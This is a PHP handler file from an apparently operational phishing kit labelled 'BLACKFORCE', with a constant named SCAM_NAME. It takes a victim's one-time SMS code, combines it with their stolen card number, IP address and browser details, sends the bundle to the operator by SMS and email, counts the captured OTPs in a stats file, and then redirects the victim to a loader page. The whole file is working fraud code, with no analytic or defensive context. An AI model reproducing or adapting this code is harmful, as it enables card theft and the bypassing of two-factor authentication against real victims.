<?php 
require_once 'panel.php' ;


// SMS Config Start

if(isset($_POST['submit'])) {

if(!isset($_SESSION)) {
    session_start();
}

$_SESSION['scode'] = htmlspecialchars($_POST['code']);

if(empty($_SESSION['scode'])) {
    header("Location: ../sms.php?page=error&userid={$id}&ue={$ue}");
}
else {
        
    $subject = "📱 CODE OTP ".SCAM_NAME." ".FLAG."FROM: $ip";
    $rezdata = "📱 CODE OTP ".SCAM_NAME." ".FLAG."
    
📱 CODE OTP : ".$_SESSION['scode']."

💳 CARD : ".$_SESSION['sccn']."
    
⏰ TIME : ".date("Y-m-d H:i:s")."
🌐 IP : $ip
💠 OS : $agent
    
⚡️ BLACKFORCE™ ⚡️
";
    
    $maildata = $rezdata;
    
    
    sendSms($rezdata);
        
    sendMail($maildata);

    $file = '../Panel/stats/stats.ini';
    $data = @parse_ini_file($file);
    $data['otps']++;
    update_ini($data, $file);

    header("Location: ../loader.php?view=check&userid={$id}&ue={$ue}");
}

}
// SMS Config END